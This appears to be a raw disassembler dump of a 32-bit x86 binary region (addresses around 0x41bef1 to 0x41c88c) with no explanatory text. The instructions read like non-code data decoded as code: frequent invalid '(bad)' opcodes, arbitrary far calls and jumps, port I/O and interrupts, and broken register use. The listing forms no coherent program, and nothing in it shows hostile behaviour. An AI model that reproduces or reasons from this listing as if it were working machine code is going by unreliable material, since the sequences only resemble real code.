  41bef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef2:	test   eax,0xe7c394a6
  41bef7:	cmp    eax,0x40739b8b
  41befc:	je     0x41be9c
  41befe:	arpl   WORD PTR [ecx-0x38],bx
  41bf01:	neg    DWORD PTR [eax]
  41bf03:	dec    eax
  41bf04:	mov    cl,cl
  41bf06:	mov    bh,0xb3
  41bf08:	jp     0x41bec4
  41bf0a:	pop    eax
  41bf0b:	mov    ebp,0x8d21dd9d
  41bf10:	adc    esp,edx
  41bf12:	xchg   edi,eax
  41bf13:	jae    0x41bede
  41bf15:	xchg   ebx,eax
  41bf16:	ret    0x98bd
  41bf19:	add    eax,0x5da8510a
  41bf1e:	in     eax,dx
  41bf1f:	mov    esi,0xd3caf981
  41bf24:	ss test eax,0xa4e08d0e
  41bf2a:	mov    eax,DWORD PTR [ecx]
  41bf2c:	je     0x41befd
  41bf2e:	inc    esi
  41bf2f:	stos   DWORD PTR es:[edi],eax
  41bf30:	inc    ebp
  41bf31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf32:	cmc    
  41bf33:	stc    
  41bf34:	lods   al,BYTE PTR ds:[esi]
  41bf35:	sbb    al,0x2f
  41bf37:	and    BYTE PTR [edx],dl
  41bf39:	cwde   
  41bf3a:	and    BYTE PTR [esi],ch
  41bf3c:	imul   ebx,DWORD PTR [edx-0x14],0xfbe01834
  41bf43:	mov    WORD PTR [ebp-0x41],?
  41bf46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf47:	xor    ebp,DWORD PTR [eax+0xd]
  41bf4a:	aas    
  41bf4b:	inc    eax
  41bf4c:	jb     0x41bed8
  41bf4e:	push   eax
  41bf4f:	xlat   BYTE PTR ds:[ebx]
  41bf50:	xchg   edx,eax
  41bf51:	daa    
  41bf52:	mov    esp,0xff437a11
  41bf57:	pop    ss
  41bf58:	jmp    0x41bf28
  41bf5a:	mov    ch,0xae
  41bf5c:	data16 mov al,ds:0x9b43a199
  41bf62:	xor    al,0xdf
  41bf64:	push   esp
  41bf65:	inc    esp
  41bf66:	mov    DWORD PTR [edi-0x6],edi
  41bf69:	into   
  41bf6a:	enter  0xbb5f,0x46
  41bf6e:	lds    edx,FWORD PTR [edx-0x24]
  41bf71:	inc    ebx
  41bf72:	inc    esp
  41bf73:	adc    eax,0x3cc9e8d5
  41bf78:	jl     0x41bf71
  41bf7a:	std    
  41bf7b:	pop    ds
  41bf7c:	test   al,0x9a
  41bf7e:	imul   esp,DWORD PTR [edx-0xb],0xffffffa5
  41bf82:	mov    eax,ds:0xfe4aec63
  41bf87:	push   edx
  41bf88:	dec    eax
  41bf89:	call   DWORD PTR [eax]
  41bf8b:	or     dl,BYTE PTR [esi+0x7b]
  41bf8e:	repz sub eax,DWORD PTR [eax]
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	and    al,0xbb
  41c002:	and    eax,0x1293498
  41c007:	add    BYTE PTR [ecx+eax*1],al
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	cmp    DWORD PTR [eax+ebx*2-0x4c],esi
  41c010:	leave  
  41c011:	psubsb mm3,QWORD PTR [ecx+eax*4+0x5f]
  41c016:	dec    esi
  41c017:	aam    0x53
  41c019:	inc    edx
  41c01a:	jnp    0x41bfa7
  41c01c:	mov    BYTE PTR [edi],dh
  41c01e:	loop   0x41c08b
  41c020:	xor    eax,0x544cdf44
  41c025:	addr16 (bad) 
  41c028:	xchg   esi,eax
  41c029:	ror    BYTE PTR [ebx],0x6e
  41c02c:	fstp   TBYTE PTR [ecx+ebp*1]
  41c02f:	sub    eax,0xa95013f6
  41c034:	and    eax,0x85f80bcd
  41c039:	pop    edx
  41c03a:	icebp  
  41c03b:	cdq    
  41c03c:	xlat   BYTE PTR ds:[ebx]
  41c03d:	push   es
  41c03e:	xchg   BYTE PTR [edx+0x5c],bl
  41c041:	push   cs
  41c042:	sbb    bh,cl
  41c044:	out    0x78,eax
  41c046:	scas   al,BYTE PTR es:[edi]
  41c047:	shl    DWORD PTR [eax+0x7034e9ec],cl
  41c04d:	mov    eax,ds:0xe6e7e8be
  41c052:	mov    ebx,DWORD PTR [ebp+0x0]
  41c055:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41c057:	add    eax,0x5809e41b
  41c05c:	retf   
  41c05d:	in     eax,dx
  41c05e:	pusha  
  41c05f:	shl    DWORD PTR [edx],cl
  41c061:	les    edi,FWORD PTR [ebx+edi*1+0x1f211c08]
  41c068:	and    ah,dh
  41c06a:	fcmovu st,st(7)
  41c06c:	dec    ebx
  41c06d:	rcl    dh,0x92
  41c070:	dec    esp
  41c071:	fs in  eax,dx
  41c073:	mov    ah,0x44
  41c075:	pushf  
  41c076:	mov    eax,ds:0x8f21769a
  41c07b:	adc    al,0xb9
  41c07d:	and    bl,BYTE PTR [ecx-0x5bb998ba]
  41c083:	shr    BYTE PTR [eax],1
  41c085:	mov    BYTE PTR ds:0x7039bce7,ah
  41c08b:	jbe    0x41c024
  41c08d:	mov    ebp,0x28a6f24b
  41c092:	xor    cl,ch
  41c094:	dec    edi
  41c095:	call   0x1a7f:0x72a3fdf5
  41c09c:	pop    ebx
  41c09d:	push   ebp
  41c09e:	add    al,0xe1
  41c0a0:	mov    edx,0x14afd624
  41c0a5:	and    BYTE PTR [esi-0x11],dh
  41c0a8:	stos   BYTE PTR es:[edi],al
  41c0a9:	push   edx
  41c0aa:	aam    0x1a
  41c0ac:	sub    DWORD PTR [ebp+eax*2+0x38215d4c],0x18
  41c0b4:	pusha  
  41c0b5:	(bad)  
  41c0b6:	addr16 inc eax
  41c0b8:	add    DWORD PTR [esi+ebx*1],ecx
  41c0bb:	pusha  
  41c0bc:	je     0x41c11d
  41c0be:	fdivr  DWORD PTR [edi-0x2739644]
  41c0c4:	retf   
  41c0c5:	outs   dx,BYTE PTR ds:[esi]
  41c0c6:	cmp    eax,0x4bca7205
  41c0cb:	shr    BYTE PTR [edx+0x4d7c07e4],cl
  41c0d1:	dec    edi
  41c0d2:	xor    ah,BYTE PTR [edi-0x40]
  41c0d5:	out    dx,al
  41c0d6:	sub    BYTE PTR ds:0xda8f2bf9,bl
  41c0dc:	sbb    al,0xcd
  41c0de:	xchg   edi,eax
  41c0df:	cdq    
  41c0e0:	mov    bl,0xac
  41c0e2:	xchg   ebx,eax
  41c0e3:	int    0x92
  41c0e5:	test   esi,0xf49ff1b8
  41c0eb:	xchg   DWORD PTR [ebx+0x7b],ebx
  41c0ee:	daa    
  41c0ef:	idiv   eax
  41c0f1:	imul   BYTE PTR [edx+0xd]
  41c0f4:	push   ecx
  41c0f5:	int    0x85
  41c0f7:	and    ecx,ecx
  41c0f9:	test   BYTE PTR [edx+0x29],bl
  41c0fc:	ret    0x64d6
  41c0ff:	sbb    eax,0xda0c3e0f
  41c104:	scas   al,BYTE PTR es:[edi]
  41c105:	int    0x6a
  41c107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c108:	shr    DWORD PTR [ebp-0xc],1
  41c10b:	and    eax,0x8c9e6a5d
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x88d7f6e9,eax
  41c183:	hlt    
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	mov    bh,0x5d
  41c18e:	outs   dx,BYTE PTR ds:[esi]
  41c18f:	jnp    0x41c139
  41c191:	jnp    0x41c17d
  41c193:	jns    0x41c151
  41c195:	add    al,0xba
  41c197:	pop    edi
  41c198:	sub    bh,BYTE PTR [ebx+ecx*4-0x66870a6c]
  41c19f:	lahf   
  41c1a0:	jge    0x41c129
  41c1a2:	cmp    BYTE PTR [esi+0x7faabead],al
  41c1a8:	test   eax,0x2eef031c
  41c1ad:	or     DWORD PTR [ecx-0x64e12fc1],ecx
  41c1b3:	or     DWORD PTR [esi-0x7],esp
  41c1b6:	inc    ebx
  41c1b7:	cdq    
  41c1b8:	mov    esp,0x9a2a7ccf
  41c1bd:	xor    al,0x84
  41c1bf:	and    bl,al
  41c1c1:	add    al,0xee
  41c1c3:	jl     0x41c14e
  41c1c5:	mov    esi,0x145e2567
  41c1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1cb:	mov    edx,0x7bfca559
  41c1d0:	arpl   WORD PTR [ecx+0x79a3b12e],si
  41c1d6:	repz leave 
  41c1d8:	clc    
  41c1d9:	push   ebp
  41c1da:	std    
  41c1db:	push   ecx
  41c1dc:	das    
  41c1dd:	loope  0x41c1aa
  41c1df:	push   ecx
  41c1e0:	test   al,0xf
  41c1e2:	jnp    0x41c18d
  41c1e4:	or     edx,edx
  41c1e6:	mov    esi,0xea3dabb
  41c1eb:	inc    esi
  41c1ec:	jo     0x41c1ec
  41c1ee:	push   ss
  41c1ef:	into   
  41c1f0:	outs   dx,BYTE PTR ds:[esi]
  41c1f1:	jecxz  0x41c203
  41c1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1f4:	(bad)  
  41c1f5:	not    DWORD PTR [edx]
  41c1f7:	ret    
  41c1f8:	lods   al,BYTE PTR ds:[esi]
  41c1f9:	pop    ebp
  41c1fa:	es sbb al,0x1d
  41c1fd:	lea    ebx,[ecx+edx*2-0x4021ffd]
  41c204:	nop
  41c205:	adc    DWORD PTR es:[edi-0x76e48539],ebx
  41c20c:	hlt    
  41c20d:	xlat   BYTE PTR ds:[ebx]
  41c20e:	idiv   BYTE PTR [edi-0x770b9dd8]
  41c214:	fld    TBYTE PTR [eax-0x4a6309c8]
  41c21a:	lock sub esp,DWORD PTR [esi+ebp*1+0x706e2137]
  41c222:	loopne 0x41c1c7
  41c224:	pop    ebp
  41c225:	mov    edx,0xf9f7486
  41c22a:	fistp  DWORD PTR [ebx+0x5cbf25b]
  41c230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c231:	imul   ebp,DWORD PTR [ecx+0x67],0xfffffff3
  41c235:	outs   dx,DWORD PTR ds:[esi]
  41c236:	dec    ebx
  41c237:	nop
  41c238:	(bad)  
  41c239:	pop    ds
  41c23a:	stos   BYTE PTR es:[edi],al
  41c23b:	dec    esi
  41c23c:	icebp  
  41c23d:	mov    fs:0x72f2ce42,eax
  41c243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c244:	inc    esi
  41c245:	icebp  
  41c246:	and    ah,BYTE PTR ds:0x79ac4d22
  41c24c:	pop    ss
  41c24d:	xor    eax,0x75edfaad
  41c252:	inc    esp
  41c253:	inc    esi
  41c254:	test   BYTE PTR [esi],0xae
  41c257:	mov    ds:0x5d3e68da,al
  41c25c:	shr    DWORD PTR [eax+0x11],0x75
  41c260:	scas   al,BYTE PTR es:[edi]
  41c261:	jno    0x41c243
  41c263:	mov    ?,WORD PTR [ecx+eiz*4]
  41c266:	xor    bh,dh
  41c268:	repnz sbb bh,cl
  41c26b:	pop    ss
  41c26c:	mov    ebp,0x8d0baa22
  41c271:	jp     0x41c2e3
  41c273:	mov    cl,0xec
  41c275:	add    ebp,0xffffffde
  41c278:	xchg   ebp,eax
  41c279:	sbb    esp,DWORD PTR [ebx+0x68]
  41c27c:	jl     0x41c26b
  41c27e:	push   esi
  41c27f:	stos   DWORD PTR es:[edi],eax
  41c280:	push   ecx
  41c281:	and    DWORD PTR [edx+0x5a],ebx
  41c284:	pop    ds
  41c285:	and    BYTE PTR [ebx-0x6cb883dd],ch
  41c28b:	stos   DWORD PTR es:[edi],eax
  41c28c:	cli    
  41c28d:	mov    ecx,DWORD PTR [esi+0x6]
	...
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	sub    al,0xbd
  41c302:	sub    esp,edi
  41c304:	cmp    al,0x2b
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	popa   
  41c30d:	(bad)  
  41c30e:	pop    ss
  41c30f:	daa    
  41c310:	fcomp  st(6)
  41c312:	xor    BYTE PTR [edi+0x6b10744c],0x89
  41c319:	dec    ecx
  41c31a:	mov    cl,0x8c
  41c31c:	jecxz  0x41c2ab
  41c31e:	fs (bad) 
  41c320:	mov    al,ds:0x6bfb0968
  41c325:	xchg   ebp,eax
  41c326:	and    BYTE PTR [edx],al
  41c328:	mov    ecx,0x6a82f802
  41c32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c32e:	and    dl,cl
  41c330:	cli    
  41c331:	das    
  41c332:	out    0x90,eax
  41c334:	shl    DWORD PTR [ebp+ebp*4+0x30],0xc1
  41c339:	pop    ebx
  41c33a:	fistp  WORD PTR [ebx-0x68b3e37e]
  41c340:	in     al,dx
  41c341:	ins    DWORD PTR es:[edi],dx
  41c342:	jp     0x41c398
  41c344:	mov    bh,0x9d
  41c346:	cmp    DWORD PTR [ecx],esp
  41c348:	fbstp  TBYTE PTR ds:0x81c9b245
  41c34e:	cmp    BYTE PTR [edx+0x6bfa195a],0xa7
  41c355:	call   0x3d7dd1b9
  41c35a:	repz inc edi
  41c35c:	dec    edi
  41c35d:	dec    edx
  41c35e:	retf   0x2c66
  41c361:	cs xchg edx,eax
  41c363:	scas   eax,DWORD PTR es:[edi]
  41c364:	jmp    0x41c325
  41c366:	inc    eax
  41c367:	mov    dl,0x14
  41c369:	fmul   DWORD PTR [ecx]
  41c36b:	and    dh,BYTE PTR [eax+0x49684147]
  41c371:	mov    ecx,0x29c3255
  41c376:	stc    
  41c377:	add    DWORD PTR [edi-0x30],ecx
  41c37a:	cs mov ebx,0x8e1d2a8a
  41c380:	cmp    al,0xad
  41c382:	out    0x76,al
  41c384:	push   0xffffff9d
  41c386:	jg     0x41c3e0
  41c388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c389:	mov    esi,0xc62b40e1
  41c38e:	fisttp WORD PTR [edx+ebx*4+0x21]
  41c392:	call   0x12fdf7fb
  41c397:	jmp    0x2fe1:0x6505bdd9
  41c39e:	neg    BYTE PTR [edx]
  41c3a0:	out    0xbc,eax
  41c3a2:	or     eax,0x7e6ef1b7
  41c3a7:	pushf  
  41c3a8:	idiv   BYTE PTR [ebx-0x521939d2]
  41c3ae:	pop    ebx
  41c3af:	outs   dx,BYTE PTR ds:[esi]
  41c3b0:	xchg   ecx,eax
  41c3b1:	cmp    ah,BYTE PTR [esi+0x5f0c31e8]
  41c3b7:	adc    esp,ebx
  41c3b9:	(bad)  
  41c3ba:	cld    
  41c3bb:	and    ah,dl
  41c3bd:	push   0x5852de0
  41c3c2:	xor    ah,BYTE PTR [edi+0x72]
  41c3c5:	jp     0x41c3c9
  41c3c7:	sbb    eax,0xfd983230
  41c3cc:	mov    eax,0x8e3be9ec
  41c3d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3d2:	and    al,0x23
  41c3d4:	mov    ch,0xc8
  41c3d6:	mov    ecx,0x7b8b6911
  41c3db:	pop    edx
  41c3dc:	pop    ecx
  41c3dd:	daa    
  41c3de:	pop    ss
  41c3df:	dec    esi
  41c3e0:	jnp    0x41c3bd
  41c3e2:	jle    0x41c3d9
  41c3e4:	jecxz  0x41c43a
  41c3e6:	jb     0x41c38e
  41c3e8:	or     ebx,DWORD PTR [edi]
  41c3ea:	sub    eax,0x7aecb917
  41c3ef:	lock popa 
  41c3f1:	(bad)  
  41c3f3:	out    0xed,eax
  41c3f5:	sti    
  41c3f6:	enter  0xa34d,0x31
  41c3fa:	inc    ebx
  41c3fb:	ss jb  0x41c443
  41c3fe:	adc    ebp,DWORD PTR [esi+0x30]
  41c401:	jecxz  0x41c413
  41c403:	sar    esi,0x28
  41c406:	ret    
  41c407:	push   ss
  41c408:	lods   al,BYTE PTR cs:[esi]
  41c40a:	dec    ecx
  41c40b:	outs   dx,BYTE PTR ds:[esi]
  41c40c:	push   edi
  41c40d:	bound  edi,QWORD PTR [edi+0xdf]
	...
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c481:	or     BYTE PTR [edx+0x12c4046],bl
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	xor    BYTE PTR [ecx-0x25],dl
  41c48f:	cld    
  41c490:	sti    
  41c491:	xchg   edx,eax
  41c492:	jns    0x41c46e
  41c494:	xchg   edx,eax
  41c495:	inc    ebx
  41c496:	mov    eax,0xfb87fa7b
  41c49b:	mov    ds:0xced66c37,eax
  41c4a0:	add    BYTE PTR [esi+0x21],bh
  41c4a3:	lods   eax,DWORD PTR ds:[esi]
  41c4a4:	outs   dx,BYTE PTR ds:[esi]
  41c4a5:	xor    al,0x5c
  41c4a7:	(bad)  
  41c4a8:	mov    ch,0xd3
  41c4aa:	and    al,0x2e
  41c4ac:	mov    ds:0xe77916ee,eax
  41c4b1:	xchg   DWORD PTR [ebx],eax
  41c4b3:	stos   DWORD PTR es:[edi],eax
  41c4b4:	adc    ebx,ecx
  41c4b6:	(bad)  
  41c4b7:	xchg   ecx,eax
  41c4b8:	xlat   BYTE PTR ds:[ebx]
  41c4b9:	call   0xb53e5ccf
  41c4be:	pop    ebx
  41c4bf:	push   ebp
  41c4c0:	lea    esi,[esi]
  41c4c2:	fmul   DWORD PTR [eax]
  41c4c4:	idiv   BYTE PTR [ebx]
  41c4c6:	inc    ecx
  41c4c7:	sub    BYTE PTR [ebx],cl
  41c4c9:	cmp    al,0x90
  41c4cb:	dec    ecx
  41c4cc:	ins    DWORD PTR es:[edi],dx
  41c4cd:	jecxz  0x41c468
  41c4cf:	neg    DWORD PTR [ecx-0x18b88f67]
  41c4d5:	inc    eax
  41c4d6:	mov    esp,fs
  41c4d8:	(bad)  
  41c4d9:	into   
  41c4da:	add    BYTE PTR [ebx+0x10],0x60
  41c4de:	dec    ebx
  41c4df:	mov    ebp,0xe986677f
  41c4e4:	jmp    0xedc3:0xd8a0529e
  41c4eb:	and    BYTE PTR [esi+ebx*8-0x66522d6d],0x43
  41c4f3:	mov    edi,0x56a2e8d0
  41c4f8:	outs   dx,DWORD PTR ds:[esi]
  41c4f9:	(bad)
  41c4fd:	xchg   ebp,eax
  41c4fe:	enter  0x5e8f,0xef
  41c502:	aam    0x46
  41c504:	jns    0x41c50f
  41c506:	jnp    0x41c4f8
  41c508:	mov    WORD PTR [ebx+0x598b382f],?
  41c50e:	cmp    BYTE PTR [ebx-0x7d],ah
  41c511:	xor    BYTE PTR [edx+0x315155cc],0x14
  41c518:	daa    
  41c519:	jg     0x41c599
  41c51b:	jecxz  0x41c4fd
  41c51d:	in     al,dx
  41c51e:	(bad)  
  41c51f:	sti    
  41c520:	cli    
  41c521:	jo     0x41c4e0
  41c523:	and    BYTE PTR [eax],cl
  41c525:	fs mov edx,0xf233040d
  41c52b:	test   DWORD PTR [esi+esi*1+0x73],0xea2127d8
  41c533:	mov    ebx,DWORD PTR [eax-0x2da0b59c]
  41c539:	test   al,0x5b
  41c53b:	ror    ecx,0xb2
  41c53e:	into   
  41c53f:	mov    esi,0xa4088e2c
  41c544:	lods   eax,DWORD PTR ds:[esi]
  41c545:	mov    ecx,0xda6905e0
  41c54a:	mov    ecx,0x65aab0a
  41c54f:	inc    edx
  41c550:	ficom  WORD PTR [edx+0x7b37bd6]
  41c556:	jnp    0x41c4f7
  41c558:	adc    eax,0x85e031f2
  41c55d:	adc    eax,ebx
  41c55f:	xchg   esi,eax
  41c560:	sub    BYTE PTR [ebp-0x31],cl
  41c563:	mov    eax,0xe263e090
  41c568:	aam    0x6
  41c56a:	imul   esi,esp,0xce6ee1a2
  41c570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c571:	test   DWORD PTR [ebp-0x408f274],esp
  41c577:	hlt    
  41c578:	or     BYTE PTR [ecx],bl
  41c57a:	pop    es
  41c57b:	push   cs
  41c57c:	dec    esp
  41c57d:	pop    es
  41c57e:	dec    BYTE PTR [eax]
  41c580:	fs imul edx,esi,0x21
  41c584:	or     BYTE PTR [esi],bh
  41c586:	repz sar DWORD PTR [ebx+0x460b3674],cl
  41c58d:	jns    0x41c567
  41c58f:	fadd   DWORD PTR [eax]
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x5c19da52
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	jmp    0xf09e3c74
  41c611:	lods   eax,DWORD PTR ds:[esi]
  41c612:	jb     0x41c624
  41c614:	pop    eax
  41c615:	sahf   
  41c616:	pop    ebp
  41c617:	cmp    bh,ch
  41c619:	lods   eax,DWORD PTR ds:[esi]
  41c61a:	xor    dl,BYTE PTR [edi-0x41]
  41c61d:	xor    edi,ecx
  41c61f:	retf   
  41c620:	lods   eax,DWORD PTR ds:[esi]
  41c621:	xchg   BYTE PTR [ebp+0x45],cl
  41c624:	enter  0xb0ea,0xf
  41c628:	lds    esp,FWORD PTR [ecx-0x7a]
  41c62b:	jo     0x41c671
  41c62d:	cmc    
  41c62e:	adc    BYTE PTR [esi-0x386ae2be],bh
  41c634:	(bad)  
  41c635:	jmp    0x7394ecba
  41c63a:	gs dec eax
  41c63c:	and    bl,BYTE PTR [ebp+0x6b14e15f]
  41c642:	sahf   
  41c643:	jl     0x41c605
  41c645:	clc    
  41c646:	jg     0x41c65a
  41c648:	add    dl,BYTE PTR [eax+0x3895c69d]
  41c64e:	xor    dh,dl
  41c650:	aad    0x69
  41c652:	jmp    0x78b473ae
  41c657:	xchg   edi,eax
  41c658:	popa   
  41c659:	sbb    DWORD PTR [ebx-0x29],esp
  41c65c:	sahf   
  41c65d:	rcl    BYTE PTR [ebx+edi*2-0xa093c8c],1
  41c664:	sbb    edi,DWORD PTR [eax-0x2b]
  41c667:	inc    edx
  41c668:	mov    ch,dl
  41c66a:	cs sub bl,dh
  41c66d:	(bad)  
  41c66e:	mov    ebx,0x9ff6747c
  41c673:	(bad)  
  41c674:	fdivrp st(5),st
  41c676:	(bad)  
  41c677:	cld    
  41c678:	push   esi
  41c679:	pop    edx
  41c67a:	rcl    DWORD PTR [eax-0x695e4720],1
  41c680:	out    0x1f,al
  41c682:	les    ebp,FWORD PTR [edx-0x2fb67019]
  41c688:	xor    al,0x4b
  41c68a:	pop    ss
  41c68b:	xchg   ecx,eax
  41c68c:	lods   al,BYTE PTR ds:[esi]
  41c68d:	daa    
  41c68e:	push   eax
  41c68f:	loopne 0x41c655
  41c691:	cmp    esi,DWORD PTR [edx+esi*1+0x75]
  41c695:	push   ds
  41c696:	and    ah,bl
  41c698:	mov    dh,0x9f
  41c69a:	sub    eax,0xba25542
  41c69f:	sub    al,BYTE PTR [eax+eax*2-0x11c1f5d]
  41c6a6:	jp     0x41c643
  41c6a8:	cmp    BYTE PTR [eax+esi*2+0x6bf6d8c0],0xf2
  41c6b0:	(bad)  
  41c6b1:	push   ebx
  41c6b2:	pushf  
  41c6b3:	test   BYTE PTR [esi+0x782e4512],0x1a
  41c6ba:	mov    al,0xa1
  41c6bc:	jo     0x41c72f
  41c6be:	push   eax
  41c6bf:	test   al,0x1e
  41c6c1:	adc    DWORD PTR [eax+0x17],ebx
  41c6c4:	cmp    al,0x11
  41c6c6:	cmp    al,0xf
  41c6c8:	xor    eax,esi
  41c6ca:	push   ds
  41c6cb:	lahf   
  41c6cc:	push   ebp
  41c6cd:	push   edx
  41c6ce:	cs xor eax,0xfc41b71
  41c6d4:	test   ah,cl
  41c6d6:	ins    DWORD PTR es:[edi],dx
  41c6d7:	pop    esi
  41c6d8:	bound  esp,QWORD PTR [ecx-0x5991e895]
  41c6de:	bound  edi,QWORD PTR [edx+0x55d69fce]
  41c6e4:	rcr    DWORD PTR [edi+0x6f],1
  41c6e7:	or     eax,0x9d71daea
  41c6ec:	jmp    0x41c69e
  41c6ee:	inc    edx
  41c6ef:	sar    DWORD PTR [esi],cl
  41c6f1:	pop    eax
  41c6f2:	and    edi,DWORD PTR [edi+eiz*8-0x515db8]
  41c6f9:	lahf   
  41c6fa:	jle    0x41c74d
  41c6fc:	mulps  xmm0,XMMWORD PTR [esi+0x60]
  41c700:	xor    cl,BYTE PTR [edi+esi*2+0x1d]
  41c704:	enter  0xc92,0x9
  41c708:	sbb    eax,0x6330ec6a
  41c70d:	push   esi
  41c70e:	add    eax,0x8c
	...
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	adc    eax,0x4896033d
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	sbb    dh,dh
  41c78e:	dec    ebp
  41c78f:	iret   
  41c790:	inc    DWORD PTR [ebp-0x6f]
  41c793:	cld    
  41c794:	call   0xf7ba:0x927ac7af
  41c79b:	ja     0x41c815
  41c79d:	stos   BYTE PTR es:[edi],al
  41c79e:	inc    edi
  41c79f:	inc    ecx
  41c7a0:	mov    bh,0xa3
  41c7a2:	popf   
  41c7a3:	loope  0x41c772
  41c7a5:	xchg   edx,eax
  41c7a6:	test   eax,0x5979806c
  41c7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7ac:	(bad)
  41c7af:	mov    ch,0x26
  41c7b1:	jb     0x41c7a6
  41c7b3:	int3   
  41c7b4:	adc    ebp,DWORD PTR [ebp+0x3717f1c5]
  41c7ba:	popa   
  41c7bb:	dec    eax
  41c7bc:	inc    ebp
  41c7bd:	leave  
  41c7be:	push   eax
  41c7bf:	add    al,0xbb
  41c7c1:	call   0x3dbf:0xbd93d632
  41c7c8:	shl    DWORD PTR [esi+0x29],cl
  41c7cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7cc:	jno    0x41c821
  41c7ce:	int    0x35
  41c7d0:	mov    bh,0x54
  41c7d2:	dec    ecx
  41c7d3:	aad    0x1a
  41c7d5:	aad    0xda
  41c7d7:	inc    ebp
  41c7d8:	push   cs
  41c7d9:	push   0x60
  41c7db:	add    eax,0x79638bbf
  41c7e0:	out    0x4f,al
  41c7e2:	cs mov esi,0x857f2994
  41c7e8:	pop    esp
  41c7e9:	stc    
  41c7ea:	push   ss
  41c7eb:	scas   eax,DWORD PTR es:[edi]
  41c7ec:	imul   esi,DWORD PTR [edi-0x50],0xd807d72
  41c7f3:	mov    al,0x2d
  41c7f5:	dec    ebp
  41c7f6:	push   edi
  41c7f7:	mov    ebp,0xc56e976e
  41c7fc:	cmp    BYTE PTR [eax+0x3f],0x9f
  41c800:	cmp    dl,dh
  41c802:	dec    ecx
  41c803:	mov    ?,ebx
  41c805:	out    0xae,eax
  41c807:	stc    
  41c808:	xchg   BYTE PTR [eax-0x463cb60e],bl
  41c80e:	mov    ecx,0xed002ac
  41c813:	hlt    
  41c814:	cmc    
  41c815:	jp     0x41c853
  41c817:	xchg   BYTE PTR [ecx],al
  41c819:	pusha  
  41c81a:	sub    esi,DWORD PTR [ecx-0x435351ca]
  41c820:	add    bh,cl
  41c822:	call   0xd694f34
  41c827:	sub    BYTE PTR [eax],cl
  41c829:	xchg   DWORD PTR [edx-0x5b],edi
  41c82c:	addr16 sbb eax,0x955e9925
  41c832:	arpl   WORD PTR [edx],dx
  41c834:	inc    eax
  41c835:	fimul  DWORD PTR [edi+0x2e]
  41c838:	inc    ebp
  41c839:	not    ecx
  41c83b:	lds    ebx,FWORD PTR [ecx]
  41c83d:	pop    ebx
  41c83e:	dec    edx
  41c83f:	mov    edi,0x69b8743e
  41c844:	lea    edx,[edx+0x49]
  41c847:	sub    BYTE PTR [esi-0x5f067882],bh
  41c84d:	ret    0x6bf4
  41c850:	pop    esp
  41c852:	fistp  QWORD PTR [ebx-0x631549ed]
  41c858:	dec    ecx
  41c859:	jns    0x41c849
  41c85b:	sar    esp,cl
  41c85d:	cmp    al,BYTE PTR [eax+0x7ee0491b]
  41c863:	idiv   DWORD PTR [edi]
  41c865:	add    BYTE PTR [ebx+ebp*8],bh
  41c868:	cwde   
  41c869:	fist   DWORD PTR [edx]
  41c86b:	fs mov edx,0xab28c596
  41c871:	hlt    
  41c872:	inc    ebp
  41c873:	push   ecx
  41c874:	xchg   edi,eax
  41c875:	add    edi,DWORD PTR [ebp+0x2aa6e866]
  41c87b:	outs   dx,DWORD PTR ds:[esi]
  41c87c:	(bad)  
  41c87d:	repnz cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41c880:	jle    0x41c8fe
  41c882:	test   eax,0xa23e96ac
  41c887:	lea    edi,[ecx-0x7d]
  41c88a:	int    0xec
  41c88c:	cld    
